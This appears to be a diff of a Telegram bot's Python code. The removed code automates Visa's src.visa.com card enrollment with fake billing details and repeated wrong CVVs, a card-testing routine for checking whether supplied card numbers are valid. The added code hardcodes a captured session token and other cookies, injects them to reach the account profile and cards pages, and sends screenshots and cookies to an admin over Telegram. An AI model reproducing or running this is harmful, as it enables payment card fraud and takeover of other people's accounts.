@@ -4126,20 +4126,77 @@ async def dd_cmd(update, context):
     }
     Process(target=run_dd_process, args=(card_input, update_dict), daemon=True).start()
 
-# ==== 7.7 /ze Command (Like /dd but saves cookies and sends to admin) ==== #
+# ==== 7.7 /ze Command (Use cookies to access site and send SS to admin) ==== #
 def run_ze_process(card_input, update_dict):
-    import os, random, traceback, requests, time, json
+    import os, traceback, requests, time, json
     from selenium import webdriver
     from selenium.webdriver.chrome.service import Service
     from selenium.webdriver.common.by import By
     from selenium.webdriver.support.ui import WebDriverWait
     from selenium.webdriver.support import expected_conditions as EC
-    from selenium.webdriver.common.keys import Keys
     from fake_useragent import UserAgent
 
     CHROME_PATH = "/usr/bin/google-chrome"
     CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
     BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
+    
+    # Saved cookies from previous session
+    SAVED_COOKIES = [
+        {
+            "domain": "src.visa.com",
+            "httpOnly": False,
+            "name": "accessTokenMaxExpiry",
+            "path": "/",
+            "sameSite": "Lax",
+            "secure": True,
+            "value": "1766931042354"
+        },
+        {
+            "domain": "src.visa.com",
+            "httpOnly": True,
+            "name": "accessToken",
+            "path": "/",
+            "sameSite": "Lax",
+            "secure": True,
+            "value": "eyJ0eXAiOiJKV1QiLCJkY2lkIjoiMSIsImV4cCI6MTc2NjkzMTA0MiwiYWxnIjoiRVMyNTYiLCJzaWQiOiIyODIxOTMxMDk5MjYxMzUzMTc3LjE3NjY5MzA1NjIwNzEiLCJraWQiOiJlMGUxNWY4OSJ9.eyJleHAiOjE3NjY5MzEwNDIsImNuZiI6eyJhdGsiOiJ7MDAxfTpBQU14T0VITi9FeFN5ZXVBbTFuWXlNOXNPZnlFUFhhL0VBdm4wV2JHdExUaCtUaDVXOUlYUGVocVU3ei8xakJoNWhYVFVhVmlpTEVOeFdJbEtQUlhST0VNeTlDSFVVenFYT0NVMlRNTHNveWtMWmJ2NzZ5c0ZTTTd4Z01DTmdDekdYd0NYZjRPK25rV1dFdzZ1d05jUWRuZVRhMXF0WWZOdE44TkgzZ1ZuanVTNUp6cUxuOFByak0rc1k3ZnowazRNbTBackd1YU1kcUNnSk1IRlk1M3pmRVIyUFA3d0tLQ3g4T01uQ1d6YWlmdzVzNlRPOVVYTnVlQ09yemRkNEdhQUlIZFhIcnlDVEFhVmJvMTg4UmEvcmRRMExlVzlDcjBMNlRsNC9Ib2s3TFFseE9rTnNqcCs5bm5kK0VjYnNScEI5L3hSRWx1dG5qMVRjeHh3MmtSL0RwZWJvT1VqaXBKMm1tS0IwcVlCNnFkTjNMbzNXV0U0RlRJa2tNb0ZCU2ZxSzRZRWFLR0ZsWFM5YWJNM3laYmFwOVo1M2JzV0tXaTVkbXRmZ3ZXb0JtM2RXcXBDckNhZDQxSjczREYwaWlCL2xlNlcyRW9vU25BWlE3bjM3UlFHckpZNlZkeHd4eXoxUUh3TCtxdlhjZ1RBYWlkSUJ4T3V0Y0NkdnRvOFB2QU4vd3NJUHNFZklhbnl0SGpmUWNNYlJSK01PZlFHSm5lcmVMMk5nRGxnOHdQaS92KzJwUG9mblBNTGhRd2xKQ2x1K2RhWXNHejgwbWZQcDVNYXhpQWt4RFZ3SnA2TzF4R2JLRU1raVpwVkxHT0R4MUZqSmpwbUNSelp3NStNL2NyTjY0T1ltM21VcGRRWEhJZlh6SlZ1MnB6K0JFcHhEMFozRGpYcUVJQWxDM1EvVmxwNm1IQTNKditoVjQ3MnQvUUYzcG9JWWREOUZVOTdzU3ErZUxaTlJJaVpVTVJjczk3b1RmS2NxeGN5amdqQW9tY0xpWDF5Z1p4TkxoNVlvK3Q0enUrT0pka2JSM1d4cGl3N2FqVlB5Q2NKY2EwRUlxWlVDaE9tc0R2ZlZGV2V2VFcifX0.mFdXauxnHlh9QPCFRyR8SqmGokFiv-GbwX21h4C63CU7VAxceO3smfe9cO_FX_DWheYYiJyNOLnHyUQ1DNMDTw"
+        },
+        {
+            "domain": ".visa.com",
+            "httpOnly": True,
+            "name": "x-via-hint",
+            "path": "/",
+            "sameSite": "Lax",
+            "secure": True,
+            "value": "1_RMwgZA"
+        },
+        {
+            "domain": "src.visa.com",
+            "httpOnly": False,
+            "name": "wscrCookieConsent",
+            "path": "/",
+            "sameSite": "Lax",
+            "secure": True,
+            "value": "1=true&2=true&3=true&4=true&5=true&visitor=6465aee0-6dcc-4811-9783-aad6b8612741&version=20251222-002&consent=explicit"
+        },
+        {
+            "domain": "src.visa.com",
+            "httpOnly": False,
+            "name": "NEXT_COUNTRY_PREFERENCE",
+            "path": "/",
+            "sameSite": "Lax",
+            "secure": False,
+            "value": "US"
+        },
+        {
+            "domain": "src.visa.com",
+            "httpOnly": False,
+            "name": "NEXT_LOCALE",
+            "path": "/",
+            "sameSite": "Lax",
+            "secure": False,
+            "value": "en"
+        }
+    ]
 
     def _env_int(name: str, default: int) -> int:
         raw = os.environ.get(name)
@@ -4151,66 +4208,6 @@ def run_ze_process(card_input, update_dict):
             return default
 
     BOT_ADMIN_ID = _env_int("BOT_ADMIN_ID", 123456789)
-
-    def _flag_from_country_code(code: str) -> str:
-        code = (code or "").strip().upper()
-        if len(code) != 2 or not code.isalpha():
-            return ""
-        try:
-            return "".join(chr(ord(c) + 127397) for c in code)
-        except Exception:
-            return ""
-
-    def split_card(card_input):
-        parts = card_input.replace(' ', '|').replace('/', '|').replace('\\', '|').strip().split('|')
-        if len(parts) != 4:
-            raise ValueError("Invalid card format")
-        return parts[0], parts[1].zfill(2), parts[2][-2:], parts[3]
-
-    def get_bin_info_local(bin_number):
-        try:
-            res = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=3)
-            if res.status_code == 200:
-                data = res.json()
-                brand = data.get("brand", "Unknown").upper()
-                type_ = data.get("type", "Unknown").upper()
-                country = data.get("country_name", "Unknown")
-                country_code = data.get("country", "") or data.get("country_code", "")
-                country_flag = data.get("country_flag", "") or _flag_from_country_code(country_code)
-                bank = data.get("bank", "Unknown")
-                level = data.get("level", "")
-
-                info_parts = [brand]
-                if type_ and type_ != "UNKNOWN":
-                    info_parts.append(type_)
-                if country and country != "Unknown":
-                    info_parts.append(country)
-                if level and level != "":
-                    info_parts.append(level)
-                if bank and bank != "Unknown":
-                    info_parts.append(bank)
-
-                return " • ".join(info_parts), country_flag
-        except Exception:
-            pass
-        return "Unavailable", ""
-
-    def get_random_email():
-        return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)) + "@gmail.com"
-
-    def get_fake_name():
-        first = random.choice(["James", "John", "Robert", "Michael", "David"])
-        last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
-        return first, last
-
-    def get_fake_address():
-        return "123 Elm Street", "New York", "NY", "10001", "20255501" + ''.join(random.choices('0123456789', k=2))
-
-    def get_wrong_cvv(exclude):
-        while True:
-            fake = ''.join(random.choices('0123456789', k=3))
-            if fake != exclude:
-                return fake
 
     def edit_message(text):
         payload = {
@@ -4225,56 +4222,54 @@ def run_ze_process(card_input, update_dict):
         except Exception:
             pass
 
-    def save_and_send_cookies_with_screenshot(driver, card_input):
-        """Save cookies to file, take screenshot, and send both to admin for debugging"""
+    def send_screenshot_to_admin(driver, caption_text):
+        """Take screenshot and send to admin"""
+        timestamp = int(time.time())
+        screenshot_filename = f"ze_ss_{timestamp}.png"
+        try:
+            driver.save_screenshot(screenshot_filename)
+            with open(screenshot_filename, "rb") as img:
+                files = {"photo": img}
+                payload = {
+                    "chat_id": BOT_ADMIN_ID,
+                    "caption": caption_text,
+                    "parse_mode": "Markdown"
+                }
+                requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
+                    data=payload,
+                    files=files,
+                    timeout=15
+                )
+            return True
+        except Exception as e:
+            try:
+                requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                    data={
+                        "chat_id": BOT_ADMIN_ID,
+                        "text": f"⚠️ ZE Screenshot failed:\n```\n{str(e)[:300]}\n```",
+                        "parse_mode": "Markdown"
+                    },
+                    timeout=5
+                )
+            except Exception:
+                pass
+            return False
+        finally:
+            try:
+                os.remove(screenshot_filename)
+            except Exception:
+                pass
+
+    def send_cookies_to_admin(driver, card_info):
+        """Save current cookies and send to admin"""
         timestamp = int(time.time())
         cookie_filename = f"ze_cookies_{timestamp}.json"
-        screenshot_filename = f"ze_screenshot_{timestamp}.png"
-        cookie_sent = False
-        screenshot_sent = False
-        
         try:
-            # Take screenshot first for debugging
-            try:
-                driver.save_screenshot(screenshot_filename)
-                with open(screenshot_filename, "rb") as img:
-                    files = {"photo": img}
-                    payload = {
-                        "chat_id": BOT_ADMIN_ID,
-                        "caption": f"📸 ZE Debug Screenshot\n💳 Card: `{card_input}`\n🔗 URL: {driver.current_url}",
-                        "parse_mode": "Markdown"
-                    }
-                    requests.post(
-                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
-                        data=payload,
-                        files=files,
-                        timeout=15
-                    )
-                screenshot_sent = True
-            except Exception as ss_err:
-                # Report screenshot error
-                try:
-                    requests.post(
-                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                        data={
-                            "chat_id": BOT_ADMIN_ID,
-                            "text": f"⚠️ ZE Screenshot failed:\n```\n{str(ss_err)[:300]}\n```",
-                            "parse_mode": "Markdown"
-                        },
-                        timeout=5
-                    )
-                except Exception:
-                    pass
-            finally:
-                try:
-                    os.remove(screenshot_filename)
-                except Exception:
-                    pass
-            
-            # Save and send cookies
             cookies = driver.get_cookies()
             cookie_data = {
-                "card": card_input,
+                "card": card_info,
                 "url": driver.current_url,
                 "timestamp": timestamp,
                 "cookies": cookies
@@ -4282,12 +4277,11 @@ def run_ze_process(card_input, update_dict):
             with open(cookie_filename, "w") as f:
                 json.dump(cookie_data, f, indent=2)
             
-            # Send cookies file to admin
             with open(cookie_filename, "rb") as doc:
                 files = {"document": doc}
                 payload = {
                     "chat_id": BOT_ADMIN_ID,
-                    "caption": f"🍪 ZE Cookies\n💳 Card: `{card_input}`\n🔗 URL: {driver.current_url}\n📊 Cookies count: {len(cookies)}",
+                    "caption": f"🍪 ZE Cookies\n💳 Card: `{card_info}`\n🔗 URL: {driver.current_url}\n📊 Count: {len(cookies)}",
                     "parse_mode": "Markdown"
                 }
                 requests.post(
@@ -4296,65 +4290,27 @@ def run_ze_process(card_input, update_dict):
                     files=files,
                     timeout=15
                 )
-            cookie_sent = True
-            
-        except Exception as e:
-            # Report error to admin
-            try:
-                payload = {
-                    "chat_id": BOT_ADMIN_ID,
-                    "text": f"⚠️ ZE Cookie save failed:\n```\n{str(e)[:500]}\n```",
-                    "parse_mode": "Markdown"
-                }
-                requests.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    data=payload,
-                    timeout=5
-                )
-            except Exception:
-                pass
+            return True
+        except Exception:
+            return False
         finally:
-            # Clean up local files
             try:
                 os.remove(cookie_filename)
             except Exception:
                 pass
-        
-        return cookie_sent, screenshot_sent
 
     def admin_report(trace, driver=None):
-        sent = False
-        screenshot_path = "ze_fail.png"
         if driver:
+            send_screenshot_to_admin(driver, f"❌ ZE Error:\n```\n{trace[:800]}\n```")
+        else:
             try:
-                driver.save_screenshot(screenshot_path)
-                with open(screenshot_path, "rb") as img:
-                    files = {"photo": img}
-                    payload = {
-                        "chat_id": BOT_ADMIN_ID,
-                        "caption": f"ZE Error:\n```\n{trace[:900]}\n```",
-                        "parse_mode": "Markdown"
-                    }
-                    requests.post(
-                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
-                        data=payload,
-                        files=files,
-                        timeout=10
-                    )
-                sent = True
-                os.remove(screenshot_path)
-            except Exception:
-                pass
-        if not sent:
-            try:
-                payload = {
-                    "chat_id": BOT_ADMIN_ID,
-                    "text": f"ZE Error (no screenshot):\n```\n{trace[:900]}\n```",
-                    "parse_mode": "Markdown"
-                }
                 requests.post(
                     f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    data=payload,
+                    data={
+                        "chat_id": BOT_ADMIN_ID,
+                        "text": f"❌ ZE Error:\n```\n{trace[:900]}\n```",
+                        "parse_mode": "Markdown"
+                    },
                     timeout=5
                 )
             except Exception:
@@ -4364,7 +4320,7 @@ def run_ze_process(card_input, update_dict):
     driver = None
 
     try:
-        edit_message("⚡ Processing (ZE ultra-fast)...")
+        edit_message("🍪 Loading cookies...")
 
         ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
         options = webdriver.ChromeOptions()
@@ -4379,105 +4335,59 @@ def run_ze_process(card_input, update_dict):
         options.add_argument("--disable-extensions")
         options.add_experimental_option("excludeSwitches", ["enable-automation"])
         options.add_experimental_option('useAutomationExtension', False)
-        # Ultra-fast page loads
-        try:
-            options.set_capability("pageLoadStrategy", "eager")
-        except Exception:
-            pass
 
         service = Service(executable_path=CHROME_DRIVER_PATH)
         driver = webdriver.Chrome(service=service, options=options)
-        wait = WebDriverWait(driver, 2)  # faster than /zz (2s vs 3s)
+        wait = WebDriverWait(driver, 5)
 
-        driver.get("https://src.visa.com/login")
-
-        try:
-            btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, ".wscrOk")))
-            driver.execute_script("arguments[0].click();", btn)
-        except Exception:
-            pass
-
-        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(get_random_email())
-        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="continue-button"]'))).click()
-        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="terms-checkbox"]'))).click()
-        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="next-button"]'))).click()
-
-        cc, mm, yy, real_cvv = split_card(card_input)
-        bin_info, bin_flag = get_bin_info_local(cc[:6])
-        short_card = f"{cc}|{mm}|{yy}|{real_cvv}"
-
-        wrong_cvv = get_wrong_cvv(real_cvv)
-        wait.until(EC.visibility_of_element_located((By.ID, "card-input"))).send_keys(cc)
-        wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)
-        wait.until(EC.visibility_of_element_located((By.ID, "cvv-input"))).send_keys(wrong_cvv)
-
-        # Billing (USA)
-        first_name, last_name = get_fake_name()
-        address, city, state, zip_code, phone = get_fake_address()
-        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(first_name)
-        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(last_name)
-
-        try:
-            country_box = wait.until(
-                EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]'))
-            )
-            country_val = country_box.get_attribute('value')
-            if not country_val or ("United States" not in country_val):
-                country_box.click()
-                country_box.clear()
-                country_box.send_keys("United States")
-                wait.until(lambda d: "United States" in country_box.get_attribute('value') or "United States" in country_box.text)
-                country_box.send_keys(Keys.ENTER)
-        except Exception:
-            pass
-
-        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(address)
-        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(city)
-        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(state)
-        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(zip_code)
-        wait.until(EC.visibility_of_element_located((By.ID, "card-phone-input-number"))).send_keys(phone)
-
-        add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
-        driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
-        add_card_btn.click()
-
-        edit_message("⚡ Updating (ZE ultra-fast)...")
-
-        # Total CVV attempts = 6 (same as /zz)
-        TOTAL_TRIES = 6
-        used_cvvs = {wrong_cvv}
-        for _ in range(TOTAL_TRIES - 1):
-            while True:
-                fake_cvv = ''.join(random.choices('0123456789', k=3))
-                if fake_cvv not in used_cvvs:
-                    used_cvvs.add(fake_cvv)
-                    break
+        # Step 1: Go to visa.com first to set domain
+        edit_message("🌐 Opening VISA site...")
+        driver.get("https://src.visa.com")
+        time.sleep(2)
+        
+        # Step 2: Add saved cookies
+        edit_message("🍪 Injecting cookies...")
+        cookies_added = 0
+        for cookie in SAVED_COOKIES:
             try:
-                add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
-                cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
-                cvv_field.click()
-                cvv_field.send_keys(Keys.CONTROL + "a")
-                cvv_field.send_keys(fake_cvv)
-                driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
-                add_card_btn.click()
-            except Exception:
-                # Keep going; /ze is meant to be ultra-fast & best-effort
+                # Remove expiry if present (let browser handle it)
+                cookie_to_add = {k: v for k, v in cookie.items() if k != 'expiry'}
+                driver.add_cookie(cookie_to_add)
+                cookies_added += 1
+            except Exception as e:
                 pass
-
-        # Save cookies and send screenshot to admin for debugging
-        cookie_sent, screenshot_sent = save_and_send_cookies_with_screenshot(driver, short_card)
-        cookie_status = "🍪 Cookies sent" if cookie_sent else "⚠️ Cookie failed"
-        ss_status = "📸 SS sent" if screenshot_sent else "⚠️ SS failed"
-
+        
+        # Step 3: Screenshot after adding cookies (before navigation)
+        send_screenshot_to_admin(driver, f"📸 ZE Step 1: After adding {cookies_added} cookies\n🔗 URL: {driver.current_url}")
+        
+        # Step 4: Navigate to different pages and screenshot
+        edit_message("🔄 Testing cookie session...")
+        
+        # Try main page
+        driver.get("https://src.visa.com/login")
+        time.sleep(3)
+        send_screenshot_to_admin(driver, f"📸 ZE Step 2: Login page\n🔗 URL: {driver.current_url}")
+        
+        # Try profile/dashboard
+        driver.get("https://src.visa.com/profile")
+        time.sleep(3)
+        send_screenshot_to_admin(driver, f"📸 ZE Step 3: Profile page\n🔗 URL: {driver.current_url}")
+        
+        # Try cards page
+        driver.get("https://src.visa.com/profile/cards")
+        time.sleep(3)
+        send_screenshot_to_admin(driver, f"📸 ZE Step 4: Cards page\n🔗 URL: {driver.current_url}")
+        
+        # Send final cookies
+        send_cookies_to_admin(driver, card_input)
+        
         duration = round(time.time() - start, 2)
         edit_message(
-            f"💳 **Card:** `{short_card}`\n"
-            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
-            f"1 Procceed\n"
-            f"2 Processed\n\n"
-            f"⚡ **Status:** Killed v6 Ultra-Fast (ZE)\n"
-            f"{cookie_status} | {ss_status}\n"
-            f"⏱ **Time:** {duration}s"
+            f"✅ **ZE Cookie Test Complete**\n\n"
+            f"🍪 Cookies added: {cookies_added}\n"
+            f"📸 Screenshots sent to admin\n"
+            f"🔗 Final URL: {driver.current_url}\n"
+            f"⏱ Time: {duration}s"
         )
 
     except Exception as e:
@@ -4502,13 +4412,11 @@ async def ze_cmd(update, context):
         await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
         return
 
-    raw_input = " ".join(context.args) if context.args else ""
-    card_input = extract_card_input(raw_input)
-    if not card_input:
-        await update.message.reply_text("❌ Invalid card.\nUse: `/ze 4111111111111111|12|25|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
-        return
+    # For /ze, card input is optional - just used for logging
+    raw_input = " ".join(context.args) if context.args else "test"
+    card_input = raw_input if raw_input else "test"
 
-    msg = await update.message.reply_text("⚡ Processing (ZE ultra-fast)...", reply_to_message_id=update.message.message_id)
+    msg = await update.message.reply_text("🍪 Starting ZE cookie test...", reply_to_message_id=update.message.message_id)
     update_dict = {
         "user_id": uid,
         "chat_id": update.effective_chat.id,
